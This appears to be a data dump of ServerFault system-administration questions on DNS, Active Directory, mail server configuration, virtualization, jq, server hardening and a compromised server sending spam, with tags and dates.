"950532","Public DNS conflicts with Networks internal DNS","<p>we are focussed on building websites/webservices for quite a few years now and right now in discussions with the company which manages a companies network. I just can't believe what they are telling us so i would like to ask if this is true for all Microsoft AD networks.</p>

<p><strong>Situation:</strong></p>

<ul>
<li>We own/control the public DNS record ""example.com"" </li>
<li>The company which manages the companies internal network named the domain controller also ""example.com""</li>
<li>So now whenever we need a subdomain e.g. staging.example.com we have to report that to the company which manages the network to make this subdomain available in the network</li>
</ul>

<p>As far as i can see the company could have named their domain controller however they wanted. Would they have given the domain controller a name like managed-network-example.com all this conflicts wouldn't exist?</p>

<p>Throughout the discussions they blamed us that we didn't use www.example.com to reach the website instead we redirected to example.com in the browser. Then when we switched and redirected to www.example.com just to find out that this resulted in a 404 error because they had to point the www subdomain to our webservers IP. In the aftermath they told us thats absolutely normal that we have to inform them about every subdomain we wanna use so that it's reachable from within the network. </p>

<p>So is this the way you setup an internal network, making a public DNS record more or less irrelevant?</p>

<p>Thanks for your replies!</p>
","<domain-name-system><active-directory><internal-dns>","2019-01-24 09:34:08"
"950534","Continously monitor network consumption of per process on Linux","<p>I have a server running Debian Stretch with a lot of running services and from the hoster's monitoring I can see some pretty hefty traffic spikes every now and then (not regular). As this could be malicious traffic, I need to find out what process is responsible.</p>

<p>Is there an way to log network usage on a per process basis (like Nethogs, but continuously)? I would like some kind of monitoring which tells me how much traffic each service generated over the last minute/5 minutes/hour/day/week. Like munin does, but not only Apache...</p>

<p>With a lot of tools it seems that either you see it happening or, if you are too late and the offending process has terminated, you have no way of knowing what it was.</p>
","<linux><network-monitoring><statistics>","2019-01-24 09:39:25"
"991954","Does Git send out information over the internet?","<p>If we install git on a server and use SSH protocol or HTTP/S to pull/push repo, Does it count like send out information over internet? How can I make sure that does not happen on a windows machine.</p>
","<windows><networking><ssh><git>","2019-11-15 07:49:08"
"871317","OnlyOffice: Port forwarding","<p>I'm setting up my own server and one of the things I'd like to run on it is OnlyOffice. However, I do not know how to properly configure my router and the DNS settings on my domain. I want onlyoffice.thijs365.com to point to the OnlyOffice installation on my server, but I'd also like to host a website on another server in my network. They both use ports 80 and 443. How do I do this? I'm running the community edition.</p>

<p>Thanks,
THijs365</p>
","<domain-name-system><port-forwarding>","2017-08-30 19:04:57"
"871320","Windows Linux Subsystem keep running and load on boot","<p>I managed to get the WLS installed with a working LAMP environment. Now I have noticed that if I close the terminal, apache stops running. In order for me to load sites from localhost, I need to load up a terminal and restart apache.</p>

<p>Is there a way I can start WLS as a background process on boot so I don't have to constantly restart apache?</p>

<p>Thanks</p>
","<linux><windows><ubuntu>","2017-08-30 19:28:16"
"991982","jq : Get values from children array and display on parent array","<p>I try to get theses value :</p>

<p>""VmDisplayName, CreationTimeUTC, EndTimeUTC, Reason, Result, State, TotalSize, BackupServerReference, BackupJobSessionReference"" from this json :</p>

<pre><code>{
  ""JobSessionUid"": ""urn:veeam:BackupJobSession:fe8a7b44-5d5d-4767-e5f4-db0dba854c59"",
  ""CreationTimeUTC"": ""2017-11-14T21:02:54Z"",
  ""EndTimeUTC"": ""2017-11-14T21:03:30Z"",
  ""State"": ""Completed"",
  ""Result"": ""Success"",
  ""Reason"": """",
  ""TotalSize"": 599785472,
  ""VmUid"": ""urn:VMware:Vm:11e45620-a0dc-1278-6d13-11a58ce70564.vm-1128"",
  ""VmDisplayName"": ""VMName"",
  ""Name"": ""VMName@2017-11-14 21:02:54"",
  ""UID"": ""urn:veeam:BackupTaskSession:540c9985-52ab-ab01-a453-e0126edf8716"",
  ""Links"": [
    {
      ""Rel"": ""Up"",
      ""Href"": ""https://10.255.147.125:9398/api/backupServers/e435adc7-63f9-4115-be34-0a647e8faa1e"",
      ""Name"": ""veeam-dcc-02"",
      ""Type"": ""BackupServerReference""
    },
    {
      ""Rel"": ""Up"",
      ""Href"": ""https://10.255.147.125:9398/api/backupSessions/fe8a7b44-5d5d-4767-e5f4-db0dba854c59"",
      ""Name"": ""Backup Name@2017-11-14 21:00:02"",
      ""Type"": ""BackupJobSessionReference""
    },
    {
      ""Rel"": ""Alternate"",
      ""Href"": ""https://10.255.147.125:9398/api/backupTaskSessions/540c9985-52ab-ab01-a453-e0126edf8716"",
      ""Name"": ""VMName@2017-11-14 21:02:54"",
      ""Type"": ""BackupTaskSessionReference""
    },
    {
      ""Rel"": ""Related"",
      ""Href"": ""https://10.255.147.125:9398/api/vmRestorePoints/6f27c79f-1d5c-4cf9-b5f8-43143447bc00?format=Entity"",
      ""Name"": ""VMName@2017-11-14 21:03:03"",
      ""Type"": ""VmRestorePoint""
    }
  ],
  ""Href"": ""https://10.255.147.125:9398/api/backupTaskSessions/540c9985-52ab-ab01-a453-e0126edf8716?format=Entity"",
  ""Type"": ""BackupTaskSession""
}
</code></pre>

<p>The objective is to display all elements in root json with jq, like this :</p>

<pre><code>{
  ""JobSessionUid"": ""urn:veeam:BackupJobSession:fe8a7b44-5d5d-4767-e5f4-db0dba854c59"",
  ""CreationTimeUTC"": ""2017-11-14T21:02:54Z"",
  ""EndTimeUTC"": ""2017-11-14T21:03:30Z"",
  ""State"": ""Completed"",
  ""Result"": ""Success"",
  ""Reason"": """",
  ""TotalSize"": 599785472,
  ""VmUid"": ""urn:VMware:Vm:11e45620-a0dc-1278-6d13-11a58ce70564.vm-1128"",
  ""VmDisplayName"": ""VMName"",
  ""Name"": ""VMName@2017-11-14 21:02:54"",
  ""UID"": ""urn:veeam:BackupTaskSession:540c9985-52ab-ab01-a453-e0126edf8716"",
  ""BackupServerReference"": ""veeam-dcc-02"",
  ""BackupJobSessionReference"": ""Backup Name@2017-11-14 21:00:02"",
}
</code></pre>

<p>I try several commands without success :</p>

<pre><code>jq '{VmDisplayName,CreationTimeUTC,EndTimeUTC,Reason,Result,State,TotalSize} as $root | (.Links[] | select((.Type == ""BackupServerReference"")  or (.Type == ""BackupJobSessionReference""))) | . as $ref | $root + $ref'

jq '{VmDisplayName,CreationTimeUTC,EndTimeUTC,Reason,Result,State,TotalSize} as $root | (.Links[] | + {""BackupServerReference"": select(.Type == ""BackupServerReference"")})  | . as $ref | $root + $ref'
</code></pre>

<p>Can you help me ?</p>

<p>Best regards,</p>
","<json><jq>","2019-11-15 11:25:25"
"992018","Windows Server 2019 VM clustering shared storage","<p>Spec: Windows 10 host, 2 Windows Server 2019 VMS's in a cluster setup. The cluster is setup and fully functional except for the storage. 
However; I am unable to understand if this scenario is possible. I am trying to use a shared VHDX as the cluster storage for both nodes but from what I understand this is only possible in guest cluster situations. The thing is we do not want to create a guest cluster or for that matter we can't (single windows 10 desktop).  It is simple a Windows 10 host running both the 2019 vm's with the intention of using VHDX as the shared storage medium to host the application that we are developing. The idea is if one node goes down the other node will continue to host the application because of the move of storage. I assume if using a shared vhdx file as CSV it is not possible at the WS2019 level the only other alternative would be to setup an iSCSI target?</p>
","<virtualization><hyper-v><storage><windows-cluster>","2019-11-15 16:07:20"
"871374","My mails sent from Postfix + Dovecot recognized as Spam by Gmail","<p>I have a postfix + dovecot mail server. The mails sent from this server to gmail goes in spam.
The postfix is configured on our server and it has never been used for spamming. And i also added SPF, DKIM, PTR records for mail server. Here is my message:</p>

<pre><code>Delivered-To: rfsiu0211@gmail.com
Received: by 10.140.19.162 with SMTP id 31csp634153qgh;
        Wed, 30 Aug 2017 02:51:19 -0700 (PDT)
X-Received: by 10.98.76.208 with SMTP id e77mr982568pfj.81.1504086679398;
        Wed, 30 Aug 2017 02:51:19 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1504086679; cv=none;
        d=google.com; s=arc-20160816;
        b=TVGocTjddxWNeDlOV3lPvxxTbsCoSAL6qua+PyRwBXKuAipDwkeau0pNNmF+o0Pp6G
         BxzFI1Uoa8a4bBjXKlu6rVWDJIHS0cdAEdV82kIYRLigbfag6TsFEgVIqfwHCGiRCtJk
         lJNor0VNaiiUI3/PRKyyf98CDSljpboqVnacN/3u00UoI/eLDF3NipT/gcBlSf6Wt/n3
         LhWncsYvq/KLQkh+VUGX121yS6hteuxWIshEamhVJHhrIf9dvNnzmRyGoCyIXMRJMuKb
         Ndt/NFmub9P9kHMqsl7KaHvq60LJ+kcMBD1IvojKXfgvGPMjVjK5eXgo9U0ZEMO/2nYd
         Qy9Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
        h=content-language:content-transfer-encoding:mime-version:user-agent
         :date:message-id:subject:from:to:dkim-signature:dkim-filter
         :arc-authentication-results;
        bh=tuhOtE9qjqASd8ZqCLUVOhKViWPHByzhGrNam6uFrTI=;
        b=DnihaFq6QvjVGL5a1SctZbXlln6pGLzbT0CMA+foquGp0TdQB24SD4VqhRGLcuNuTC
         zREg/9yPBbaEgC/0dqnNcPwD8JqT3sI2/8bneEeXvGml3hYPokq4UO72bVd5+JlH4Hrv
         Z14y7n7PrY30K7WMCscgn/EeDNw4UxFKluEdoImGDHskOde+02evqonFnrBsYS6xVKxI
         hGlkyJzt8WU3iUyKYlE3UqtBHNXj20fibQy0w4Gwdh7bPylrzaDqT1IfViwYA3rORZLX
         /FZdJLbKoMkwY1dCmRnPBSaAxzqaS8VcdJ/LXKOumUknELweFf1tJ2qbTgQQ9BH/GMH1
         3Zdw==
ARC-Authentication-Results: i=1; mx.google.com;
       dkim=pass header.i=@chungtoi.com header.s=mail header.b=EACm4P8M;
       spf=pass (google.com: domain of thubd@chungtoi.com designates 119.17.215.32 as permitted sender) smtp.mailfrom=thubd@chungtoi.com
Return-Path: &lt;thubd@chungtoi.com&gt;
Received: from mail.chungtoi.com (mail.chungtoi.com. [119.17.215.32])
        by mx.google.com with ESMTPS id p64si4027806pga.272.2017.08.30.02.51.18
        for &lt;rfsiu0211@gmail.com&gt;
        (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);
        Wed, 30 Aug 2017 02:51:19 -0700 (PDT)
Received-SPF: pass (google.com: domain of thubd@chungtoi.com designates 119.17.215.32 as permitted sender) client-ip=119.17.215.32;
Authentication-Results: mx.google.com;
       dkim=pass header.i=@chungtoi.com header.s=mail header.b=EACm4P8M;
       spf=pass (google.com: domain of thubd@chungtoi.com designates 119.17.215.32 as permitted sender) smtp.mailfrom=thubd@chungtoi.com
Received: from akai.home (unknown [101.96.120.42]) (Authenticated sender: thubd@chungtoi.com) by mail.chungtoi.com (Postfix) with ESMTPSA id 8001B12CFF0B for &lt;rfsiu0211@gmail.com&gt;; Wed, 30 Aug 2017 16:51:21 +0700 (ICT)
DKIM-Filter: OpenDKIM Filter v2.11.0 mail.chungtoi.com 8001B12CFF0B
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=chungtoi.com; s=mail; t=1504086681; bh=tuhOtE9qjqASd8ZqCLUVOhKViWPHByzhGrNam6uFrTI=; h=To:From:Subject:Date:From; b=EACm4P8MjbGaoYbktN+dJu0cm1PCSIUKOv8wEcg8b0ZG/p/zF8JVfxXRIN49xGI+8
     zA0Pl3IX5WIPeT9if/B8iqw27mopYggxeQJUT+MX17T95X7Z49QrwI86H/QlrFNHB8
     Lkhb/v2OOHGYBRe9k7oEroi4bViWJyLahMxcUcI4=
To: ""Thư Bùi"" &lt;rfsiu0211@gmail.com&gt;
From: Thu Bui &lt;thubd@chungtoi.com&gt;
Subject: Cập nhật bản ghi
Message-ID: &lt;8e6af3e4-6ff6-3e3a-d022-9394d72486e9@chungtoi.com&gt;
Date: Wed, 30 Aug 2017 16:51:17 +0700
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Thunderbird/52.1.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit
Content-Language: en-US

Các bạn nhận được thì gửi lại thông tin cho mình nhé!
</code></pre>

<p>As you can see, my mail server is set up with the following:</p>

<pre><code>- The server has DKIM
- The server has a verified signed certificate
- SPF(TXT) is set correctly
- The server's PTR (reverse DNS) points correctly to my mail server
- All possible checking tools give a maximum result for the server (it should be trusted by everyone)
</code></pre>

<p>Does anyone know what the reason could be or what steps I should take?</p>
","<postfix><dovecot><gmail>","2017-08-31 02:36:22"
"950719","Is lxd/lxc a suitable replacement to virtual machines (vSphere, for example) for server infrastructure?","<p>I would like to move my servers to virtual machines. This is because it'll make it easier for me to fire up more machines and back them up in case the physical server is damaged (I'm not aware of other benefits). While I use virtual machines normally as isolated workstations, I'm not aware of the full set of their benefits for servers. What I mean is: I see people use (and promote) VMWare vSphere for this. More licenses seem to cost more (exponentially), and I don't know why. I'm wondering whether <a href=""https://linuxcontainers.org/lxd/introduction/"" rel=""nofollow noreferrer"">lxd</a> (It's like docker, but persists its state) is a replacement to this.</p>

<p>What are the benefits of using a virtual machine (vSphere specifically or generally any other kind) over using simple containers like lxd?</p>
","<linux><virtualization><vmware-vsphere><lxc><lxd>","2019-01-25 09:44:51"
"950790","Cloud server vulnerability analysis","<p>I have multiple Hetzner cloud servers (Ubuntu 18.04) and I have encrypted the home directory with a +128-bit encryption using cryptsetup/LUKS. The server may only be accessed with SSH or Wireguard. SSH port is non-standard and we use also fail2ban and password login is disabled. The servers don't have any open ports in addition to the mentioned SSH and Wireguard. These ports are also open only to selected few IP addresses.</p>

<p>As the home directory is encrypted on the fly, should the server be stolen or the disks taken, our data is safe. Also as the server is only accessible via SSH/Wireguard I am not overly worried about unauthorized logins.</p>

<p>What attack vectors there are that I should be worried about? I suppose that cloud server providers have the means to study a running server instance's memory and extract encryption keys. Also some side channel attack may be possible. Any other possibilities? Are there practical attacks that could penetrate iptables? I not worried about DDoS, only the security of our data. I know that state level agencies have their ways and could attack our servers for example via our desktops. But I am mainly interested what are the cloud operator's possibilities to access our data and also are the viable remote attacks?</p>
","<security><attacks><vulnerabilities><physical-security>","2019-01-25 15:46:49"
"780619","wifi only works when lan is connected","<p>Hold tight, this is a strange one...</p>

<p>I have a <a href=""http://pine64.com"" rel=""nofollow noreferrer"">board</a> with two network adapters, one lan and one wifi, each one properly configured and has its own ip address on the same network.</p>

<p>Whenever they're both connected, they both work fine, but whenever I disconnect the lan cale, the wifi connection drops too.</p>

<p><a href=""https://www.raspberrypi.org/forums/viewtopic.php?p=932926#p932926"" rel=""nofollow noreferrer"">googling</a> about it points the blame on some router setting, so here's my router model: tp link td-w8901n</p>

<p>thanks</p>
","<networking><router><wifi>","2016-06-02 18:55:33"
"992128","Secure remote access to an ""air-gapped"" system (Windows)","<p>Question: Are there secure software solutions or approaches to provide remote access to systems that customers are really worried about being hacked? I did quite a bit of googling but I am probably not looking for the right terms, most people talk about VPN's, etc. But this doesn't seem to be good enough for highly-critical infrastructure systems. Can you maybe point me in the right direction?</p>

<p>Background info: I regularly have to work on various projects where we build industrial control systems. Without going too much into details, basically, it's a mini-network with some Windows servers and work stations, some specialised industrial control equipment (PLC's) plus generally some network switches, etc.
These kinds of systems are used to control factories, water-treatment plants, etc. Generally, they run unattended or with some operator intervention to control some manufacturing process. So there is usually no engineer present.
Occasionally, things can go wrong and they need someone who knows the system to attend and fix a coding error or make some code changes.
Years ago, we would usually have a fairly simple RDP connection to one of the workstations inside this setup from where we can do our changes. Lately, everyone has rightfully been worrying more and more about security (see Stuxnet) and more and more end-users are starting to lean heavily towards ""air-gaping"" these kinds of systems. It gives them a lot more peace of mind as they are pretty confident they won't get hacked.
But this is where I have a problem. If the system is completely air-gapped, someone has to physically go there in order to address any issues or make any changes. This can be god knows where in the world, sometimes hours or even days of travelling. Hence the question above...</p>
","<remote-desktop><remote-access><remote>","2019-11-16 17:53:39"
"780644","Best way to forward whole ipv6 /64 subnet range to single address (on Linux, obv)?","<p>I want to forward incoming connections to any address within an assigned ipv6 /64 subnet on a VPS.</p>

<p>Obviously I can't add a billion individual address to the interface, but perhaps I could use a bogus route with a mangle iptables rule to pretend 1 address is a router for the subnet, then just answer arriving packets instead of forwarding them on? Not sure if that's possible or if there's a cleaner approach.</p>
","<routing><ipv6><forwarding><ip6tables>","2016-06-02 21:35:18"
"950838","Installing and Using GitLab with remote email server","<p>I want to install GitLab on my personal computer which is on a residential internet network, this means that I cannot run my own email server but I have a hosting plan that comes with its own smtp server that I can remotely connect to. Is it possible to install Gitlab and have it use the remote SMTP server?</p>
","<gitlab>","2019-01-25 20:30:21"
"992191","Dell Optiplex 990 Bios Corrupted","<p>I have an issue with dell optiplex 990, i am getting no bootable hard disk found error.</p>

<p>Videos as below</p>

<p><a href=""https://photos.app.goo.gl/6TocW3sAoM7RL8gV9"" rel=""nofollow noreferrer"">https://photos.app.goo.gl/6TocW3sAoM7RL8gV9</a></p>

<p>Problem: I tried to boot into USB drive which has windows 10, but unable to. The Bios Screen Boot Sequence is completely empty it does not have any way to select, nor i am able to see any of the boot details.</p>

<p>Steps taken: I disconnected both my hard disk configured in raid mode and plugged them to a different pc and formatted all the drives (including the 300 mb drive allocated for system). Then Connected only 1 hard disk without any data in it and configured to AHCI Mode.</p>

<p>I have inserted the jumper to reset the bios password mode, at least it boots now and able to get into boot screen. But still unable to proceed further</p>

<p>Then Connected a bootable windows 10 usb drive also a windows 10 dvd and tried to boot into it - but unable to boot into that as well.
Created a bootable dos pendrive using rufus and added dell opt</p>

<p>Kindly help</p>
","<boot><dell><bios>","2019-11-17 14:53:37"
"871559","Connect to Multiple EC2 Instances from Ubuntu without typing the IP everytime","<p>I wanted to connect my multiple Linux EC2 Instances from my Ubuntu desktop, without writing the IP of each server every time I take the SSH. 
Just like in Windows you can use WinSCP, save the SSH key and IP's of all instances, and you can directly connect(using PuTTY) to the EC2 instances.</p>
","<linux><amazon-ec2><amazon-web-services><scripting><ubuntu-16.04>","2017-08-31 20:27:37"
"992208","How can I find which one of 2 HDDs is newer?","<p>I have 2 hard drives and I really need to find which one was used latest. (they're both broken but I only want to repair newer). Can I somehow figure out which one is newer? labels does not state date of manufacture.</p>

<p>LABELS:
<a href=""https://i.sstatic.net/oK9t7.jpg"" rel=""nofollow noreferrer"">HDD1</a></p>

<p><a href=""https://i.sstatic.net/slmFm.jpg"" rel=""nofollow noreferrer"">HDD2</a></p>
","<hard-drive>","2019-11-17 19:06:49"
"780683","Connecting my domain name to my droplet","<p>I setup an Apache static website on a DigitalOcean droplet.</p>

<p>The company that hosts my domain name (webhostingpad) provides an ""Advanced DNS Zone Editor"" which I used to setup a (redirect/forward?) to my droplet.</p>

<p>My domain name is ""icecoldnugrape.com"".</p>

<p>In the ""Zone File Records"" section, with TTL=7200, Class=IN, and Type=A, I pointed ""icecoldnugrape.com."" to the IP address of my droplet. I did this a few months ago.</p>

<p>When I visit my domain name in the url I get forwarded correctly to what my droplet's Apache server is serving, but the IP address of the droplet has taken over the browser's URL bar, rather than my domain name.</p>

<p><strong>How do I keep my domain-name in the url bar of the browser?</strong></p>

<p><a href=""https://i.sstatic.net/Kl9YX.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Kl9YX.png"" alt=""enter image description here""></a></p>
","<domain-name-system><ip-address><dns-zone>","2016-06-03 01:30:19"
"871602","Tips on technology for one program, many concurrent http clients on small host?","<p>What technology could be used for one application to serve many simultaneous users on a small resource-constrained host (eg: Rasbperry Pi or similar)?</p>

<p>That is, it doesn't need a general purpose web server like Apache, as it would only need to support one application and a couple of active web pages, but many connections.</p>

<p>I understand Apache/PHP/MySQL on bigger servers, but those would seem to require too much resources to support many simultaneous (order of 100, say) connections on a small host - with every connection redundantly loading in its own copy of the same interpreted code.</p>

<p>I'm thinking, for example, to skip the general purpose webs server and have one memory resident compiled C++ program which services many concurrent HTTP connections - light weight and fast.  The application would be fairly simple.  Or perhaps an add-on or module for a lightweight web server.  Or maybe something like node.js, if that was very resource efficient and easy to scale even on a small host.  I don't even know the terminology or keywords for the style of programming I'm looking for, hence my question. </p>

<p>I tried StackOverflow, which suggested Raspberry Pi exchange, where this exchange was suggested.  Any tips or clues?</p>
","<linux><http><concurrency>","2017-09-01 05:52:28"
"871624","IPtables - how to find out which process/executable removed a chain","<p>How to find out which process or program changes IPtables (deletes one of it's chains)? </p>

<p>I run Fedora 23 server. I use it, among the others, to share Internet connection and enforce fair, dynamic traffic shaping. For the last I use Niceshaper. It adds it's chains to IPtables.</p>

<p>Recently I have discovered my server was compromised. It was used as DNS server on IPv6. IP6tables were changed. I have cleared all. Proved all /etc/ settings are unmodified. Verify all installed packages and proved they are unmodified.</p>

<p>Unluckily there is still something wrong. Despite the fact the server's configuration didn't changed for months and Niceshaper worked fine, it now started to exit after detecting it's ns_upload chain was removed.</p>

<p>I would like to find out which process removes the chain to fix it.</p>

<p>I will be thankful for your help.</p>
","<iptables><linux-networking><fedora>","2017-09-01 08:31:43"
"871755","how do I upgrade centos 6 to centos 7","<p>How do I upgrade a CentOS6.9 virtual machine to CentOS7?
I tried doing a yum -y update but that did not do it for me.</p>

<p>I would appreciate if anyone could share a procedure with me.</p>
","<centos6><centos7><upgrade>","2017-09-02 03:40:47"
"992452","Sync Windows Server shares with OneDrive","<p>Recently one of my costumers bought office 365 and now we have a slew of space online we would like to fill, so we would like to sync some main folders from WS2012 to it so it's always accessible and up to day.</p>

<p>What's the best way? I've tried onedrive but with no luck, is there any open source software you guys recommend? Preferably like a service that syncs any changes made </p>
","<backup><synchronization><shared-storage>","2019-11-19 16:16:51"
"871784","postfix TLS: handshake failure","<p>My new DSL provider is fastweb</p>

<p>cat /etc/postfix/main.cf
[...]</p>

<pre><code>relayhost = smtp.fastwebnet.it:587
smtp_sasl_auth_enable = yes
smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
</code></pre>

<p>cat /etc/postfix/sasl_passwd</p>

<pre><code>smtp.fastwebnet.it      myusername@fastwebnet.it:pass

Sep  2 16:35:30 server1 postfix/cleanup[11161]: 26AC92820A0: info: header Subject: asd from local; from=&lt;root@server1.org&gt; to=&lt;testuser@gmail.com&gt;
Sep  2 16:35:30 server1 postfix/cleanup[11161]: 26AC92820A0: message-id=&lt;20170902143529.v25nffla7mczfpss@server1.org&gt;
Sep  2 16:35:30 server1 postfix/qmgr[11150]: 26AC92820A0: from=&lt;root@server1.org&gt;, size=425, nrcpt=1 (queue active)
Sep  2 16:35:32 server1 postfix/smtp[11158]: SSL_connect error to smtp.fastwebnet.it[85.18.95.132]:587: -1
Sep  2 16:35:32 server1 postfix/smtp[11158]: warning: TLS library problem: error:14094410:SSL routines:ssl3_read_bytes:sslv3 alert handshake failure:../ssl/record/rec_layer_s3.c:1399:SSL alert number 40:
Sep  2 16:35:32 server1 postfix/smtp[11158]: 26AC92820A0: to=&lt;testuser@gmail.com&gt;, relay=smtp.fastwebnet.it[85.18.95.132]:587, delay=1.9, delays=0.12/0/1.8/0, dsn=4.7.5, status=deferred (Cannot start TLS: handshake failure)
</code></pre>
","<postfix>","2017-09-02 14:42:19"
"871838","disable apache permanently and use only nginx","<p>I'm running nodejs on localhost and nginx to set up reverse proxy server on a VPS.
Using TMUX I'm starting both nginx and nodejs and detaching from the session. I have tried disabling apache alot times but still it keeps turning on and stops nginx. I have tried following commands.</p>

<pre><code>     # chkconfig httpd off
     # /etc/init.d/httpd stop
     # chkconfig --list | grep httpd
     # httpd           0:off   1:off   2:off   3:off   4:off   5:off   6:off
</code></pre>

<p>Even though everything is off it still keeps turning on. Guess there something else thats restarting apache.</p>

<p>Its my first time using Linux. I'm not able to keep my site up because of this. Any help would keep my site live.</p>
","<apache-2.2><nginx><centos><node.js>","2017-09-03 11:59:08"
"871846","Office 365 user cannot be deleted","<p>I have a office 365 user, says its synced with AD object.
The AD object has been deleted long time ago and now i'm stuck with the Office 365 object and the delete option is grayed out.
Any ideas how to get rid of old users no longer exist in AD?</p>

<p>Thanks</p>
","<microsoft-office-365><entra-id>","2017-09-03 14:43:47"
"780965","ethernet cable configuration with possibility to connect one computer at the end or at the middle of the cable","<p>I would like to know if this Ethernet configuration would work.</p>

<p><a href=""https://i.sstatic.net/uBSW6.png"" rel=""nofollow noreferrer"">ethernet configuration</a></p>

<p>Of course, only one device could be connected to either socket 1 or socket 2.</p>

<p>The cables between router and socket 1 is 10 meters long. Same length between socket 1 and socket 2.</p>

<p>Thank you</p>
","<networking><configuration><ethernet><schema>","2016-06-04 15:21:03"
"780990","Internet router is in a different subnet","<p>The network 192.168.195.0/24 isn't mine and it's full of pcs, but it has the router 192.168.195.1 which connects to internet.
Now, I have to create the network 192.168.59.0/24 and i must connect it to the internet.
I have a linux box with 2 eth .
I may do forwarding, but then the computer in the different subnets can communicate and i don't want that. I just want to connect 192.168.59.0 to internet.
Should i use nat? Which commands should i use?</p>
","<routing>","2016-06-04 19:18:20"
"780993","Website Access Active Directory","<p>A client has an Active Directory Domain named anycomp.com and hosts their website www.anycomp.com with an external offsite ISP. Clients on the internal Active Directory Domain need access to the website but are unable to resolve the name www.anycomp.com in their browsers. What is the solution to this problem?</p>
","<gmail>","2016-06-04 19:49:45"
"992598","Secure contents of a hard drive so it can't be accessed on another computer","<p>My company is developing a device that is basically a Linux box with some attached hardware and proprietary software that is installed on several clients. What would be the best options to secure the contents of the hard drive so that it cannot be removed and inspected on another computer? Asking for a password on boot is not an option.</p>
","<hard-drive><bios><secure>","2019-11-20 15:10:03"
"871933","Block smtp botnet","<p>My server provider shutdown one of our servers and it says that is sending a tons of email. When I made a tcpdump I see the following:</p>

<pre><code>04:52:49.743068 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [P.], seq 1631:1662, ack 906, win 123, length 31: SMTP: RCPT TO:&lt;fahriozlu@gmail.com&gt;
04:52:49.959999 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [.], ack 920, win 123, length 0
04:52:50.039830 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [P.], seq 1662:1695, ack 920, win 123, length 33: SMTP: RCPT TO:&lt;fahriozlu@hotmail.com&gt;
04:52:50.253412 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [.], ack 934, win 123, length 0
04:52:50.333509 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [P.], seq 1695:1730, ack 934, win 123, length 35: SMTP: RCPT TO:&lt;fahriozparlak@gmail.com&gt;
04:52:50.556870 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [.], ack 948, win 123, length 0
04:52:50.637048 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [P.], seq 1730:1767, ack 948, win 123, length 37: SMTP: RCPT TO:&lt;fahriozparlak@hotmail.com&gt;
04:52:50.854218 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [.], ack 962, win 123, length 0
04:52:50.934357 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [P.], seq 1767:1809, ack 962, win 123, length 42: SMTP: RCPT TO:&lt;fahriozparlak@yenikonya.com.tr&gt;
04:52:51.152141 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [.], ack 976, win 123, length 0
04:52:51.232339 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [P.], seq 1809:1844, ack 976, win 123, length 35: SMTP: RCPT TO:&lt;fahriozsoydan@gmail.com&gt;
04:52:51.446160 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [.], ack 990, win 123, length 0
04:52:51.526295 IP &lt;Our IP&gt;.51796 &gt; mail.dsityre.lk.smtp: Flags [P.], seq 1844:1881, ack 990, win 123, length 37: SMTP: RCPT TO:&lt;fahriozsoydan@hotmail.com&gt;
</code></pre>

<p>It sending tons of emails. Those email addresses is not even familiar to us. As you can see it is just changing the domain name of those email address.</p>

<p>Is there anything I can check or do? We already blocked the outgoing domain name in the firewall, but it is still there. We are using debian based linux. Whizzy I think.</p>
","<linux><ubuntu><smtp><linux-networking><botnet>","2017-09-04 08:58:31"
"782048","Understanding domain registration and dns lookup","<p>I want to understand the process of how your domain gets queried from dns servers after purchasing a domain. I have not yet tried hosting and have no plans atm but I am eager to learn. </p>

<p>Here is what I have deduced so far (some are still speculations as I could not find the exact details of how it works). First, after purchasing a domain from the registrar, you will configure the DNS servers that will be authoritative for your domain in the registrar's DB. I speculate that aside from the names of the dns servers you will also configure the IP addresses of your name servers so a dns lookup on the registrar's DNS servers can give the IP of your authoritative name servers. Also, a whois look up for your domain would return the name servers you have configured.  </p>

<p>Now that people have a way to learn your nameservers ip address, they can query your own authoritative name servers for the ip address of your domains and sub domains.</p>

<p>I know it is much complicated than that, but what I want to clarify is how domain registration works and how TLD name servers KNOW who your name servers are so they can redirect requests for your domain to your name servers. At the moment I think that configuring your name servers in your registrar's db also configures the TLD name servers and the whois database. Is this correct? Or is there a separate process? I am confused whether or not the domain registrar also handles the TLD name servers. </p>
","<domain-name-system><dns-hosting><domain-registrar><domain-registration>","2016-06-05 07:23:34"
"782061","How to find when the password for my Active Directory user account will expire?","<p>I will be out of office next two weeks. May I check from my domain member workstation when exactly the password for my Active Directory user account will expire. I use Windows 8.1. My user don't have administrative rights to domain controller.</p>
","<windows><active-directory>","2016-06-05 10:35:36"
"992699","How to open google.com using curl with Host header (certificate does not match)","<p>Since Google is using HTTPS/SSL I am unable to access it using the IP of Google.com and passing the Host header. I don't understand why this is not working.</p>

<p>Here is what I have tried so far.</p>

<ol>
<li>I got the IP of Google.com</li>
</ol>

<pre><code>tracert google.com
Tracing route to google.com [216.58.207.238]
</code></pre>

<ol start=""2"">
<li>Next I tried to connect using the IP with Host header</li>
</ol>

<pre><code>$ curl -H ""Host: google.com"" https://216.58.207.238
</code></pre>

<p>I got an error:</p>

<blockquote>
  <p>curl: (51) SSL: certificate subject name '*.google.com' does not match target host name '216.58.207.238'</p>
